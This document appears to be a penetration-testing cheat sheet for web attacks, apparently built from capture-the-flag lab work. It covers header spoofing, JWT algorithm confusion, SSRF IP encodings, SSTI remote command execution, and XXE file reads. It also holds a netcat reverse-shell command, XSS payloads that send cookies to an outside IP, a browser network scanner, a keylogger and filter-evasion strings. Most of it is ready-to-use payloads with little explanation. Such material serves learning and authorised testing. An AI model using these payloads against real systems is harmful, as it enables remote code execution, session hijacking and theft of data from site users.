# HTTP
* [Basics](#basics)
  * [Headers](#headers)
* [CSRF](#csrf)
* [Flask](#flask)
* [Java](#java)
* [JWT](#jwt)
* [SSRF](#ssrf)
* [SSTI](#ssti)
  * [SSTI Basics](#ssti-basics)
  * [SSTI Automated](ssti-automated)
* [XSS](#xss)
  * [DOM-Based](#dom-based)
  * [Stored](#stored)
  * [Reflected](#reflected)
  * [Using XSS for IP and Port Scanning](#using-xss-for-ip-and-port-scanning)
  * [XSS Keylogger](#xss-keylogger)
  * [Filter Evasion](#filter-evasion)
* [XXE](#xxe)

## Basics
### Headers
**Add to bypass restrictions for localhost**
```
X-Forwarded-For: 127.0.0.1
X-Originating-IP: 127.0.0.1 
X-Forwarded-For: 127.0.0.1 
X-Remote-IP: 127.0.0.1 
X-Remote-Addr: 127.0.0.1
X-ProxyUser-Ip: 127.0.0.1
X-Original-URL: 127.0.0.1
```

![Execute Exploit](images/headers.png)

## CSRF
### Automated exploitation
pip3 install xsrfprobe
`xsrfprobe -u http://$ip/<endpoint>`

## Flask
| Info | Command |
|:-----|:--------|
| Decrypt a token | `flask-unsign --decode --cookie $token` | 
| Set cookie variable | `cookie="{'name': b'change', 'value': 8, 'isWorking': True}"` | 
| Sign cookie | `flask-unsign --sign --cookie $cookie --secret '$twiking_!T_r!cH'` |

## Java
| Info | Command |
|:-----|:--------|
| Java / NodeJS Shell | `python /usr/local/sbin/nodejsshell.py 10.4.29.43 53` |

https://opsecx.com/index.php/2017/02/08/exploiting-node-js-deserialization-bug-for-remote-code-execution/
https://blog.cmnatic.co.uk/posts/exploiting-java-deserialization-windows-demo/
https://github.com/joaomatosf/jexboss.git
https://www.cybersecpadawan.com/2020/04/tryhackme-tony-tiger-no-metasploit.html

## JWT
### New Token with public key
1. Copy token that looks like the below

```bash
eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJQYXJhZG94IiwiaWF0IjoxNjMzOTI4NzE2LCJleHAiOjE2MzM5Mjg4MzYsImRhdGEiOnsicGluZ3UiOiJub290cyJ9fQ.cmVspI2GGbgUYg543cX3DkJipufa3TZmsgd9TMmFvNgzwSN6OfPuAHS-6vKKl4L4RG0-1tagjl9ynPm8xi4fl0znsN8ncIjq-1MLrXE4Vq4RVdKDzP4zoVGJ855XbUNHUWa5GuZ2CnA5iUMfgyfTQVfa372PMCfnKR7E-H6j5wIPsukP7QGWqFbgOwrGisFlFATgTaqu_49xUXLIusyccN4y1nYH2FkRCmlDjlYa3il_nsKsmupdWurcayURj2Rg6rkuYT2uq2xBmp39dCM2qN_9wAWOt6N3Ul0WRyHCrBv0na00p0IZ6fDU7zw4RXXIJb8mVX0gLN420bn5JzvYJQ
```
2. Use RsaToHmac.py to generate new token. The payload is the second value from the token header. 

Code
```
python3 RsaToHmac.py -t eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJpc3MiOiJQYXJhZG94IiwiaWF0IjoxNjMzOTI4NTQ1LCJleHAiOjE2MzM5Mjg2NjUsImRhdGEiOnsicGluZ3UiOiJub290cyJ9fQ.FRqR8d6BYOKfh9sTt7exleFx70xEW5TeqpBNT9p429mUg3QCShx3B46Y4VJ1dUZZiea2a8OUBDganByd5MqmdAJelEEuIgbwyWc3JZ8D7KhecnZp5u6re_0ewWOsAzxlkDKQ1VHHmmq0N2Juya7wWJBmN1pJlOeFhqOPtN5ruk7Et0GAVyPXtgPD5E6KPpoF9qVA0UoJEBnKWi5u549RNFZ3AkBoAZnH6HycrISw2TvYM8YJfJKAW2VFfId85X0cmK0BoWCebjgUB4OeM5d_3c--oNpc5_4BKDHoMYWgu9hDo-CvEWvN499RToC14dex3pFk57emAmkRAzHcrURdHw -p /home/kali/Downloads/public.pem
n
{"iss":"Paradox","iat":1633928545,"exp":1633928665,"data":{"pingu":"noots"}}

```
![Execute Exploit](images/jwt_1.png)

https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token

Convert the public key to hex so openssl will use it.
`cat a | xxd -p | tr -d "\\n"`

## SSRF
* Convert IP Address to decimal
`python3 /opt/ipaddr/ip2dh.py D 127.0.0.1`

* Convert IP Address to hexadecimal
`python3 /opt/ipaddr/ip2dh.py H 127.0.0.1`

| Info | Command |
|:-----|:--------|
| Check for SQL | `http://127.0.0.1:3306` |
| Check for SQL | `http://localhost:3306` |
| Check for SQL Decimal | `http://2130706433:3306` |
| Check for SQL Hex | `http://0x7f000001:3306` |
| Check for SQL IPv6 | `http://[::]:3306` |
| Check for SQL IPv6 | `http://:::3306` |

## SSTI
Server Side Template Injection, is when a user is able to pass in a parameter that can control the template engine that is running on the server.
### SSTI Basics

**Basic proof of concept**

`{{2+2}}`

**Read a file**

`{{ ''.__class__.__mro__[2].__subclasses__()[40]()(<file>).read()}}`

**Remote command execution**

`{{config.__class__.__init__.__globals__['os'].popen(<command>).read()}}`

### SSTI Automated
Tplmap

**Reverse Shell Example**

`./tplmap.py -u http://10.10.141.79/ -d 'name' --os-cmd "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.4.29.43 53 >/tmp/f"`

**GET parameter**

`/opt/tplmap.py -u http://$ip/?<vulnparam>`

**POST parameter**

`/opt/tplmap.py -u http://$ip -d '<vulnparam>'`

## XSS
### DOM-Based
In a DOM-based XSS attack, a malicious payload is not actually parsed by the victim's browser until the website's legitimate JavaScript is executed. 
**Show alert with cookies**

`test" onmouseover="alert(document.cookie)"`

**Change background of website to red**

`test" onmouseover="document.body.style.backgroundColor = 'red';`

### Stored
Stored cross-site scripting is the most dangerous type of XSS. This is where a malicious string originates from the websites database. This often happens when a website allows user input that is not sanitised (remove the "bad parts" of a users input) when inserted into the database.  

**Process**
1. Attacker inserts malicious payload into the website database.
2. For every visit to the website the malicious script is activated.
3. The data the attackers script gathered is sent to them. They could steal the victims cookie, which would allow the attacker to take over the victims account.

**Basic Payload**
```
<script>alert(1)</script>
<img src=x onerror=alert(1) />
<svg onload=alert('XSS')>
```
**Show cookie**
`<script>alert(document.cookie)</script>`

**Change HTML object contents**
`<script> document.querySelector('#thm-title').textContent = 'I am a hacker' </script>`

**Steal a cookie**

`<script>window.location='http://10.4.29.43/?cookie='+document.cookie</script>`
`<script>fetch("http://10.4.29.43/"+document.cookie)</script>ro`
### Reflected
In a reflected cross-site scripting attack, the malicious payload is part of the victims request to the website. The website includes this payload in response back to the user. To summarise, an attacker needs to trick a victim into clicking a URL to execute their malicious payload.
**Basic Hello popup**

`http://example.com/search?keyword=<script>alert('Hello')</script>`

**Basic popup with IP Address of victim**
`http://example.com/search?keyword=<script>alert(window.location.hostname)</script>`

### Using XSS for IP and Port Scanning

For example, a website could try to find if your router has a web interface at 192.168.0.1 by:

`<img src="http://192.168.0.1/favicon.ico" onload="alert('Found')" onerror="alert('Not found')">`

The following script will scan an internal network in the range 192.168.0.0 to 192.168.0.255

```java
<script>
 for (let i = 0; i < 256; i++) {
  let ip = '192.168.0.' + i

  let code = '<img src="http://' + ip + '/favicon.ico" onload="this.onerror=null; this.src=/log/' + ip + '">'
  document.body.innerHTML += code
 }
</script>
```
### XSS Keylogger
Javascript can be used for many things, including creating an event to listen for keypresses.

```java
<script type="text/javascript">
 let l = ""; // Variable to store key-strokes in
 document.onkeypress = function (e) { // Event to listen for key presses
   l += e.key; // If user types, log it to the l variable
   console.log(l); // update this line to post to your own server
 }
</script> 
```

### Filter Evasion
Bypass the filter that removes any script tags.

`<img src=x onerror=alert('Hello');>`

Word alert is filtered.

`0\"autofocus/onfocus=alert(1)--><video/poster/onerror=prompt(2)>"-confirm(3)-"`

The word hello is filtered
`<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert('Hello')"></xss>`

Filtered is the following:
* word "Hello"
* script
* onerror
* onsubmit
* onload
* onmouseover
* onfocus
* onmouseout
* onkeypress
* onchange

`<style>@keyframes slidein {}</style><xss style="animation-duration:1s;animation-name:slidein;animation-iteration-count:2" onanimationiteration="alert('Hello')"></xss>`

## XXE
Basic Payload proof of concept

```xml
<!DOCTYPE replace [<!ENTITY name "feast"> ]>
 <userInfo>
  <firstName>falcon</firstName>
  <lastName>&name;</lastName>
 </userInfo>
 ```

Read files

```xml
<?xml version="1.0"?>
<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
<root>&read;</root>
```